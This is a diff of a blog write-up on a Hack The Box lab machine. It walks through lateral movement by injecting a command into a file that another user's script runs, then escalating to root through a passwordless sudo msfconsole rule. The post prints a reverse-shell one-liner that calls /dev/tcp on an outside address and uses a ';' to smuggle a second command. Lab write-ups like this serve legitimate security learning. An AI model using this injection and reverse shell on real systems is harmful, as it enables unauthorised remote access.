@@ -325,25 +325,62 @@ We check the file is there and make it executable (*chmod +x*):
 ![linpeas]({{https://jsom1.github.io/}}/_images/htb_sk_linpeas.png)
 </div>
 
-Finally we can run it with *./linpeas.sh*. Nothing is really standing out in the output, so let's enumerate manually. There's an interesting file in kid's home that is called *hackers*. The file permissions are interesting because we see *pwn* is the group owner.
+Finally we can run it with *./linpeas.sh*. Nothing is really standing out in the output, so let's enumerate manually. There's an interesting file in kid's home that is called *hackers*. The file permissions are interesting because we see *pwn* is the group owner and the one who executes the script.
 
 <div class="img_container">
 ![hackers file]({{https://jsom1.github.io/}}/_images/htb_sk_hackers.png)
 </div>
 
-Let's have a look at that user's home directory.
+The next step is probably to become *pwn* to get higher privileges (lateral movement). Let's have a look at that user's home directory. There's a script called *scanlosers.sh* which contains a reference to the *hackers* file located in kid's home:
 
 <div class="img_container">
 ![pwn directory]({{https://jsom1.github.io/}}/_images/htb_sk_pwn.png)
 </div>
 
-There's a script called *scanlosers.sh* which contains a reference to the *hackers* file located in kid's home. 
-TODO : check si on peut edit le script. on ne peut pas le run
+From what I understand, this script stores the content of the *hackers* file into the variable *log*. It then changes directory, reads the content of the *log* file, cuts it (to keep only the IP addresses) and sorts it. Then for each address, it does a top 10 ports nmap scan and stores the outputs in the *recon* directory. Note that we don't have access to that latter. The last line looks interesting: the command *wc -l* counts the number of lines of the log file. If it is greater than 0 (*-gt* stands for greater than), it replaces the content of the file with a new line. We can test this by writing a command such as *mkdir /home/kid/logs/.test* within the *hackers* file:
+
+<div class="img_container">
+![script]({{https://jsom1.github.io/}}/_images/htb_sk_pwn.png)
+</div>
+
+Interestingly, the file is indeed empty. However, the *.test* directory was not created... The good news is that the script is running very frequently. So, we've got the script *scanlosers.sh* that is owned and executed as the user *pwn*. I couldn't find it in a cronjob, but it is done somehow and we don't necessarily have to understand it.\\
+I had to ask for help for the syntax... Looking at the script, we see that nmap is executed by /bin/sh. We can thus use the following syntax:
+
+````
+echo “ ;/bin/bash -c ‘bash -i >& /dev/tcp/10.10.14.22/1234 0>&1’ #” >> hackers
+`````
+
+Before entering this command, we have to setup a new netcat listener on port 1234. Then, we get a revershe shell there:
+
+<div class="img_container">
+![pwn shell]({{https://jsom1.github.io/}}/_images/htb_sk_latmov.png)
+</div>
+
+After a while of looking around, I thought about checking what *pwn* could do (I should have done it earlier):
+
+<div class="img_container">
+![pwn perms]({{https://jsom1.github.io/}}/_images/htb_sk_sudol.png)
+</div>
+
+We see *pwn* can run Metasploit as root without password. So let's do that:
+````
+sudo msfconsole
+````
+Then, we can issue usual commands such as *ls*, *cd* and so on... Doing so produces a lot of errors "stty: 'standard input': Inappropriate ioctl for device", but it still does what we want:
+
+<div class="img_container">
+![root]({{https://jsom1.github.io/}}/_images/htb_sk_root.png)
+</div>
+
+And this is it for this box!
 
 
 <ins>**My thoughts**</ins>
-Lost time in a rabbit hole
-Various shell payloads
-Would give up if I didn't know there was a vulnerability
+Even though this box is rated as easy, I had a pretty difficult time. Finding the vulnerability was not that easy, and I spent a lot of time on the PoC which didn't work for some reason. It's a shame because I first found the right Metasploit exploit but failed to make it work. I was on the right track and gave up too early.\\
+Going from *kid* to *pwn* was interesting. I don't know how such a scenario could happen in real life, but I think it was more to make us think about file permissions.\\
+Finally, I spent way too much time on root... In the end, it took 30 seconds!\\
+Of course, it always looks easy when we know the solution. Looking back at that box, I don't know how I could spend so much time on it. Worse than that, I would probably have given up if I didn't know it was meant to be hacked. This is a problem I encounter on many boxes, but I'm sure I will get better at it.\\
+Overall a very interesting box, "hacking a hacker" was a new one for me!
+
 
 
